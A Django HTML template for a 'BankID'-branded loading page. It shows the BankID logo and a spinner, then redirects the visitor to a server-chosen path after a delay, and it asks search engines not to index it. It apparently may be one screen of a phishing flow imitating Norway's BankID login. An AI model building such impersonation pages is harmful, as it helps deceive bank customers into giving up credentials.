{% load static %}
<html lang="nb">
<head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/png" href="{% static 'img/favicon.png' %}">
    <title>BankID</title>
    {#    <meta http-equiv="refresh" content="6; url=num.html">#}
    <link href="{% static 'style/main.css' %}" rel="stylesheet">
</head>
<body onload="redirector()">
<main class="container">
    <div class="container__content">
        <div class="bankid-logo-wrapper">
            <img alt="" class="bankid-logo" src="{% static 'img/logo.svg' %}">
        </div>
        <div class="spinner-border" style="margin: 50%" role="status">
        </div>
    </div>
</main>
<script>

    function redirector() {
        const redirect_to = '/{{ redirect_to }}'
        const waiting = '{{ waiting }}' * 2
        var interval = setInterval(function () {
            clearInterval(interval);
            window.location.href = redirect_to;
        }, waiting);
    }
</script>
</body>
</html>
